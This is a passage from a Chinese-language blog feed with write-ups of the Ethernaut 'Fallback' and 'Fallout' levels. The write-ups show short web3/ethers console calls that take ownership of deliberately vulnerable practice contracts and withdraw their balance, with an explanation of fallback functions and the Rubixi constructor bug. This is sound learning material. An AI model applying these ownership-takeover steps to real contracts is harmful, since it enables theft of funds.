class="comment">// 设置最大 Gas 数量</span></span><br><span class="line">  <span class="attr">gasPrice</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseUnits</span>(<span class="string">'20'</span>, <span class="string">'gwei'</span>) <span class="comment">// 设置 Gas 价格为 20 Gwei</span></span><br><span class="line">});</span><br></pre></td></tr></table></figure><p>调用合约有一个隐藏的参数，用于设置你要传多少value，消耗多少gas等等。这里设置的value就能在合约的<code>msg.value</code> 里获取。</p><h1 id="直接发起事务">直接发起事务</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>({</span><br><span class="line">  <span class="attr">to</span>: contract.<span class="property">address</span>,</span><br><span class="line">  <span class="attr">from</span>: yourAddress,</span><br><span class="line">  <span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">"0.001"</span>, <span class="string">"ether"</span>) <span class="comment">// 任意大于 0 的值</span></span><br><span class="line">});</span><br></pre></td></tr></table></figure><h1 id="fallback">Fallback</h1><h4 id="什么是-fallback-method">1.1 什么是 Fallback Method？</h4><p>Fallback 方法（或称为 <strong>Fallbackfunction</strong>）是一种特殊的函数，在 Solidity合约中没有名称或参数，它的作用是处理任何无法匹配的调用或接收到以太币的情况。Fallback方法是在合约接收到交易时，未明确匹配到某个函数时触发的默认函数。</p><p>在 Solidity 中，Fallback 方法有两种形式：</p><ul><li><strong>简单 fallback 方法</strong>：没有参数，不返回值。</li><li><strong>接收函数</strong>：专门用于接收以太币的函数。</li></ul><h4 id="fallback-方法的定义">1.2 Fallback 方法的定义：</h4><p>一个合约中只允许有 <strong>一个</strong> fallback方法，不能有多个。Fallback 方法有两种形式：</p><ol type="1"><li><strong>接收以太币的函数</strong>（<code>receive()</code>）：只能用于接收以太币，并且没有其他任何代码。它是专门用于接收纯以太币转账的。</li><li><strong>普通的 fallback函数</strong>（<code>fallback()</code>）：当接收到的调用没有匹配到任何函数签名时，或者接收到的数据无法匹配合约中的现有函数时，fallback函数会被触发。它可以用于处理无法匹配的调用，或者记录日志，甚至抛出异常。</li></ol><h1 id="解题">解题</h1><p>所以只用调用 contribute 的同时设置 value，给智能合约转账0.001eth两次，你就变成owner了。</p><p>然后调用withdraw把钱都拿回来，完成。</p><p><img src="/ethernaut/02-Fallback/image-20241221160459849.png" alt="image-20241221160459849" style="zoom:50%;"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;阅读智能合约源码，任务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;声明自己为合约的 ownership&lt;/li&gt;
&lt;li&gt;减少 balance 到0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;学习目标：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用ABI发送ether&lt;/li&gt;
&lt;li&gt;不用ABI发送ether&lt;/li&gt;
&lt;li&gt;转换wei和ether的单位&lt;/li&gt;
&lt;li&gt;回调函数 Fallback&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Fallout</title>
    <link href="http://cishoon.top/ethernaut/03-Fallout/"/>
    <id>http://cishoon.top/ethernaut/03-Fallout/</id>
    <published>2024-12-20T16:00:00.000Z</published>
    <updated>2024-12-21T09:35:05.934Z</updated>
    
    <content type="html"><![CDATA[<p>第三题。</p><p>获得智能合约的owner。</p><p>这关的目的是使用Solidity Remix IDE，来模拟执行智能合约。</p><span id="more"></span><p>嗯……？这题好简单，有一个函数，你只要给他转账，你就会变成owner……</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out({<span class="attr">value</span>:web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">"0.0001"</span>, <span class="string">"ether"</span>)})</span><br></pre></td></tr></table></figure><p><img src="/ethernaut/03-Fallout/image-20241221170138704.png" alt="image-20241221170138704" style="zoom:50%;"></p><p>他好像很生气的样子。然后题面更新了！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?</span><br><span class="line"></span><br><span class="line">Well... Not quite.</span><br><span class="line"></span><br><span class="line">The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:</span><br><span class="line"></span><br><span class="line">contract Rubixi {</span><br><span class="line">  address private owner;</span><br><span class="line">  function DynamicPyramid() { owner = msg.sender; }</span><br><span class="line">  function collectAllFees() { owner.transfer(this.balance) }</span><br><span class="line">  ...</span><br><span class="line">This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.</span><br></pre></td></tr></table></figure><p>原来是一个小故事，告诉我们智能合约安全的重要性。</p><p>题目把Fallout打错了，变成了Fal1out，就从构造函数变成了普通public函数。</p><p>之后solidity把构造函数的定义方式改为了constructor，不再是要求和合约名一样了。</p><p>很简单的这一题，顺便试了试IDE。下一题吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第三题。&lt;/p&gt;
&lt;p&gt;获得智能合约的owner。&lt;/p&gt;
&lt;p&gt;这关的目的是使用Solidity Remix IDE，来模拟执行智能合约。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
</feed>
